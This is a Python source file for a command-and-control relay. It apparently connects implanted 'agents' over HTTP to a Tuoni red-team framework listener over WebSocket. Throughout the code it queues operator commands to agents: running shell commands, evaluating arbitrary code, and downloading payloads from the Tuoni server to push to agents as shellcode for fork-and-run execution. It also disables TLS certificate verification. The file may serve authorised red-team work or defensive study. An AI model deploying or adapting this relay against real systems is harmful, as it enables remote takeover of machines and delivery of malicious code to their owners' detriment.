#!/usr/bin/env python3
# /// script
# requires-python = ">=3.9"
# dependencies = ["tuoni-external", "requests>=2.28,<3"]
#
# [tool.uv.sources]
# tuoni-external = {path = "../../lib"}
# ///
"""HTTP controller - bridges sample agents to a Tuoni external WebSocket listener.

Architecture:
    Sample agent <-- HTTP POST --> this controller <-- WebSocket --> Tuoni listener

Usage:
    uv run controller.py <ws_host> <ws_port> [http_bind] [http_port]

    ws_host / ws_port   - Tuoni external listener WebSocket endpoint
    http_bind           - interface the HTTP server binds to (default: 127.0.0.1)
    http_port           - HTTP port agents POST to (default: 8080)

The controller registers every connected agent and its supported commands with
Tuoni, relays commands to agents via HTTP responses, and sends results back.
"""

import argparse
import base64
import collections
import json
import logging
import time
import uuid
from http.server import BaseHTTPRequestHandler, HTTPServer
from socketserver import ThreadingMixIn
from urllib.parse import urlsplit

import requests as http_requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from tuoni_external import ExternalListener, ExternalListenerCommands
from tuoni_external.diagnostics import clean_text, configure_logging, log_context, log_payload


logger = logging.getLogger("controller")
http_logger = logging.getLogger("controller.http")

# ---------------------------------------------------------------------------
# Command definitions
#
# Each command lists the agent types that support it.  The controller only
# registers commands the connecting agent actually handles.
# ---------------------------------------------------------------------------

COMMANDS = {
    "my_sleep": {
        "description": "Change the agent's polling interval (seconds)",
        "parameters": {
            "sleep": {"default": 1, "required": True, "type": "integer"},
        },
        "agent_types": ["python", "dotNET", "powershell", "zig"],
    },
    "my_terminal": {
        "description": "Run a shell command on the agent",
        "parameters": {
            "command": {"default": "whoami", "required": True, "type": "string"},
        },
        "agent_types": ["python", "dotNET", "powershell", "zig"],
    },
    "my_what": {
        "description": "Ask the agent to identify itself",
        "parameters": {},
        "agent_types": ["python", "dotNET", "powershell", "zig"],
    },
    "my_eval": {
        "description": "Evaluate code inside the agent",
        "parameters": {
            "code": {"default": "print('TEST')", "required": True, "type": "string"},
        },
        "agent_types": ["python", "powershell"],
    },
    "my_spawn": {
        "description": "Spawn a Tuoni payload (shellcode fork-and-run)",
        "parameters": {
            "payloadId": {"required": True, "type": "integer"},
        },
        "agent_types": ["python", "dotNET", "powershell", "zig"],
        "requires_jwt": True,
    },
}


# ---------------------------------------------------------------------------
# Agent and command bookkeeping
# ---------------------------------------------------------------------------

class Command:
    def __init__(self, cmd_id, cmd_type, cmd_conf=None):
        self.id = cmd_id
        self.type = cmd_type
        self.conf = cmd_conf

    def to_dict(self):
        result = dict(self.conf) if self.conf else {}
        result["__type__"] = self.type
        return result


class Agent:
    def __init__(self, guid, ext):
        self.ext = ext
        self.guid = guid
        self.commands = collections.deque()
        self.current_command_id = None

    def add_command(self, cmd_id, cmd_type, cmd_conf=None):
        self.commands.append(Command(cmd_id, cmd_type, cmd_conf))

    def next_command(self):
        if not self.commands:
            return None
        cmd = self.commands.popleft()
        self.current_command_id = cmd.id
        self.ext.command_sent(cmd.id)
        return cmd

    def submit_result(self, success, text, command_id=None):
        cid = command_id or self.current_command_id
        self.ext.new_result(self.guid, cid, success, result_txt={"STDOUT": text})

    def submit_failure(self, error, command_id=None):
        cid = command_id or self.current_command_id
        self.ext.new_result(self.guid, cid, False, error_msg=error)


class Controller:
    def __init__(self, *, log_payloads=False, payload_limit=1024,
                 tuoni_url=None, tuoni_user=None, tuoni_pass=None):
        self.agents = {}
        self.log_payloads = log_payloads
        self.payload_limit = payload_limit
        self.ext = ExternalListener(log_payloads=log_payloads, payload_limit=payload_limit)
        self.tuoni_url = tuoni_url
        self.jwt_token = None
        if tuoni_url and tuoni_user and tuoni_pass:
            self._tuoni_login(tuoni_url, tuoni_user, tuoni_pass)

    def _tuoni_login(self, url, user, password):
        login_url = url.rstrip("/") + "/api/v1/auth/login"
        try:
            resp = http_requests.post(
                login_url,
                auth=(user, password),
                verify=False,
                timeout=10,
            )
            resp.raise_for_status()
            self.jwt_token = resp.text.strip()
            logger.info("tuoni_jwt_login_ok", extra={"tuoni_url": clean_text(url)})
        except http_requests.RequestException as e:
            logger.error("tuoni_jwt_login_failed", extra={
                "tuoni_url": clean_text(url), "error": clean_text(e),
            })

    def _download_payload(self, payload_id):
        url = self.tuoni_url.rstrip("/") + "/api/v1/payloads/%s/download" % payload_id
        resp = http_requests.get(
            url,
            headers={"Authorization": "Bearer " + self.jwt_token},
            verify=False,
            timeout=30,
        )
        resp.raise_for_status()
        return resp.content

    def connect(self, host, port):
        self.ext.connect(host, port, on_command=self._on_command, on_connect=self._on_connect)

    def _on_connect(self):
        logger.info("controller_connected")
        self.agents.clear()

    def _on_command(self, guid, cmd_type, command_id, conf):
        with log_context(agent_guid=clean_text(guid), command_id=command_id,
                         template_name=clean_text(cmd_type)):
            self._queue_command(guid, cmd_type, command_id, conf)

    def _queue_command(self, guid, cmd_type, command_id, conf):
        try:
            if cmd_type not in COMMANDS:
                logger.warning("unknown_command_template")
                self.ext.new_result(
                    guid, command_id, False,
                    result_txt={"STDOUT": "Unknown command '%s'" % cmd_type},
                    error_msg="Unknown command '%s'" % cmd_type,
                )
                return

            cmd_setup = COMMANDS[cmd_type]
            relay_conf = {}
            for param_name in cmd_setup["parameters"]:
                if param_name in conf:
                    relay_conf[param_name] = conf[param_name]

            if cmd_type == "my_spawn":
                try:
                    payload_id = conf.get("payloadId")
                    logger.info("spawn_downloading", extra={
                        "agent_guid": clean_text(guid), "payload_id": payload_id,
                    })
                    shellcode = self._download_payload(payload_id)
                    relay_conf["shellcode"] = base64.b64encode(shellcode).decode("ascii")
                    logger.info("spawn_downloaded", extra={
                        "agent_guid": clean_text(guid), "payload_id": payload_id,
                        "shellcode_bytes": len(shellcode),
                    })
                except Exception as e:
                    logger.exception("spawn_download_failed")
                    self.ext.new_result(
                        guid, command_id, False,
                        result_txt={"STDOUT": "Payload download failed: %s" % e},
                        error_msg="Payload download failed: %s" % e,
                    )
                    return

            self.agents[guid].add_command(command_id, cmd_type, relay_conf)
            logger.debug("command_queued")
        except Exception as e:
            logger.exception("command_callback_failed")
            self.ext.new_result(
                guid, command_id, False,
                result_txt={"STDOUT": str(e)},
                error_msg=str(e),
            )

    def register_agent_commands(self, agent_id, agent_type):
        commands = ExternalListenerCommands()
        for name, definition in COMMANDS.items():
            if agent_type not in definition["agent_types"]:
                continue
            if definition.get("requires_jwt") and not self.jwt_token:
                continue
            commands.add_command_simple(name, definition["description"], definition["parameters"])
        self.ext.register_commands(commands, agent_id)

    def add_agent(self, guid, metadata, agent_type):
        if guid in self.agents:
            return
        self.ext.new_agent(guid, metadata=metadata)
        self.agents[guid] = Agent(guid, self.ext)
        self.register_agent_commands(guid, agent_type)
        logger.info("agent_registration_submitted", extra={
            "agent_guid": clean_text(guid), "agent_type": clean_text(agent_type),
        })

    def get_agent(self, guid):
        return self.agents.get(guid)


# ---------------------------------------------------------------------------
# HTTP server that agents POST to
# ---------------------------------------------------------------------------

controller = None  # set in main


class AgentHandler(BaseHTTPRequestHandler):
    """Handles agent check-in POSTs.

    Request JSON:  {id, type, username?, hostname?, result?}
    Response JSON: {} or {__type__, ...params} if a command is queued.
    """

    def handle_one_request(self):
        self._status_code = None
        self._bytes_received = 0
        self._bytes_sent = 0
        self._request_failed = False
        started = time.perf_counter()
        with log_context(request_id=uuid.uuid4().hex,
                         client=clean_text(self.client_address[0])):
            try:
                super().handle_one_request()
            except Exception:
                self._request_failed = True
                http_logger.exception("http_request_failed", extra=self._request_fields())
                # An unhandled request error already closes the connection in HTTPServer.
                # Close here after logging, avoiding its duplicate unstructured traceback.
                self.close_connection = True
            finally:
                if getattr(self, "raw_requestline", b""):
                    fields = self._request_fields()
                    fields["duration_ms"] = round((time.perf_counter() - started) * 1000, 3)
                    level = logging.DEBUG
                    if self._request_failed:
                        level = logging.ERROR
                    elif isinstance(self._status_code, int) and self._status_code >= 400:
                        level = logging.WARNING
                    http_logger.log(level, "http_request_completed", extra=fields)

    def _request_fields(self):
        # Query strings can contain credentials; they are deliberately excluded.
        path = getattr(self, "path", "")
        try:
            path = urlsplit(path).path
        except ValueError:
            path = "<invalid path>"
        return {
            "method": clean_text(getattr(self, "command", None)),
            "path": clean_text(path),
            "status_code": self._status_code,
            "bytes_received": self._bytes_received,
            "bytes_sent": self._bytes_sent,
        }

    def do_POST(self):
        fields = self._request_fields()
        with log_context(method=fields["method"], path=fields["path"]):
            http_logger.debug("http_request_received")
            self._handle_post()

    def _handle_post(self):
        content_length = self.headers.get("Content-Length")
        if not content_length:
            http_logger.warning("http_request_ignored", extra={"reason": "missing_content_length"})
            self._respond({})
            return

        try:
            length = int(content_length)
        except ValueError:
            http_logger.warning("http_request_ignored", extra={"reason": "invalid_content_length"})
            self.close_connection = True
            return
        body = self.rfile.read(length)
        self._bytes_received = len(body)
        try:
            data = json.loads(body)
        except json.JSONDecodeError as error:
            http_logger.warning("http_request_ignored", extra={
                "reason": "invalid_json", "json_line": error.lineno,
                "json_column": error.colno, "bytes_received": len(body),
            })
            self._respond({})
            return

        if "id" not in data:
            http_logger.warning("http_request_ignored", extra={"reason": "missing_id"})
            self._respond({})
            return

        log_payload(http_logger, "http_payload_received", data,
                    enabled=controller.log_payloads, limit=controller.payload_limit)

        guid = data["id"]
        agent_type = data.get("type", "unknown")
        metadata = {}
        for field in ("username", "hostname", "os", "ips", "processArch"):
            if field in data:
                metadata[field] = data[field]

        controller.add_agent(guid, metadata, agent_type)

        # Process any result the agent is returning
        result = data.get("result")
        if result is not None:
            agent = controller.get_agent(guid)
            if agent:
                success = data.get("success", True)
                agent.submit_result(success, result)
                logger.info("result_submitted", extra={
                    "agent_guid": clean_text(guid), "command_id": agent.current_command_id,
                    "success": success if isinstance(success, bool) else "<invalid %s>" % type(success).__name__,
                    "result_chars": len(str(result)),
                })

        # Send next queued command (or empty response)
        agent = controller.get_agent(guid)
        if agent:
            command = agent.next_command()
            if command:
                self._respond(command.to_dict())
                return

        self._respond({})

    def _respond(self, data):
        body = json.dumps(data).encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)
        self._bytes_sent += len(body)

    def log_request(self, code="-", size="-"):
        # The completion event includes duration and body sizes, so no second access log.
        self._status_code = code

    def send_error(self, code, message=None, explain=None):
        # The base handler writes HTML bodies outside _respond; their sent size is unknown.
        self._bytes_sent = None
        super().send_error(code, message, explain)

    def log_error(self, fmt, *args):
        # BaseHTTPRequestHandler error arguments may contain the complete request line.
        # Retain status/context without accidentally logging URL query parameters.
        status = args[0] if args and isinstance(args[0], int) else self._status_code
        http_logger.warning("http_protocol_error", extra={"status_code": status})

    def log_message(self, fmt, *args):
        http_logger.debug("http_server_message")


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def _positive_int(value):
    number = int(value)
    if number <= 0:
        raise argparse.ArgumentTypeError("must be a positive integer")
    return number


def _bind_port(value):
    number = int(value)
    if not 0 <= number <= 65535:
        raise argparse.ArgumentTypeError("must be between 0 and 65535")
    return number


def _remote_port(value):
    number = _bind_port(value)
    if number == 0:
        raise argparse.ArgumentTypeError("must be between 1 and 65535")
    return number


def parse_args(argv=None):
    parser = argparse.ArgumentParser(description=__doc__,
                                     formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("ws_host", help="Tuoni external listener hostname/IP")
    parser.add_argument("ws_port", type=_remote_port, help="Tuoni external listener port (1-65535)")
    parser.add_argument("http_bind", nargs="?", default="127.0.0.1", help="HTTP bind address (default: 127.0.0.1)")
    parser.add_argument("http_port", nargs="?", default=8080, type=_bind_port,
                        help="HTTP port (default: 8080; 0 selects an available port)")
    parser.add_argument("--log-level", type=str.upper, default="INFO",
                        choices=("DEBUG", "INFO", "WARNING", "ERROR", "CRITICAL"),
                        help="Minimum severity (default: INFO)")
    parser.add_argument("--log-format", default="text", choices=("text", "json"),
                        help="Console and file format (default: text)")
    parser.add_argument("--log-file", help="Also write rotating UTF-8 logs to this file")
    parser.add_argument("--log-max-bytes", type=_positive_int, default=5 * 1024 * 1024,
                        help="File rotation threshold (default: 5242880 bytes)")
    parser.add_argument("--log-backups", type=_positive_int, default=3,
                        help="Rotated files to retain (default: 3)")
    parser.add_argument("--log-payloads", action="store_true", help="Show redacted envelope previews at DEBUG level")
    parser.add_argument("--log-payload-limit", type=_positive_int, default=1024, metavar="CHARS",
                        help="Maximum preview length (default: 1024)")
    parser.add_argument("--tuoni-url", help="Tuoni server URL for JWT auth and payload API (e.g. https://localhost:8443)")
    parser.add_argument("--tuoni-user", help="Tuoni username for JWT login")
    parser.add_argument("--tuoni-pass", help="Tuoni password for JWT login")
    return parser.parse_args(argv)


def main(argv=None):
    global controller

    args = parse_args(argv)
    try:
        configure_logging(args.log_level, args.log_format, args.log_file,
                          args.log_max_bytes, args.log_backups)
    except (OSError, ValueError) as error:
        logging.basicConfig(level=logging.ERROR, force=True)
        logger.error("logging_configuration_failed: %s", clean_text(error))
        return 1

    class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
        daemon_threads = True

    try:
        server = ThreadedHTTPServer((args.http_bind, args.http_port), AgentHandler)
    except (OSError, OverflowError):
        logger.exception("http_bind_failed", extra={"host": clean_text(args.http_bind), "port": args.http_port})
        return 1

    try:
        controller = Controller(log_payloads=args.log_payloads, payload_limit=args.log_payload_limit,
                                tuoni_url=args.tuoni_url, tuoni_user=args.tuoni_user,
                                tuoni_pass=args.tuoni_pass)
        controller.connect(args.ws_host, args.ws_port)
        logger.info("http_server_listening", extra={
            "host": clean_text(server.server_address[0]), "port": server.server_address[1],
        })
        server.serve_forever()
    except KeyboardInterrupt:
        logger.info("controller_stopping", extra={"reason": "keyboard_interrupt"})
    except Exception:
        logger.exception("controller_failed")
        return 1
    finally:
        server.server_close()
        logger.info("http_server_stopped")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
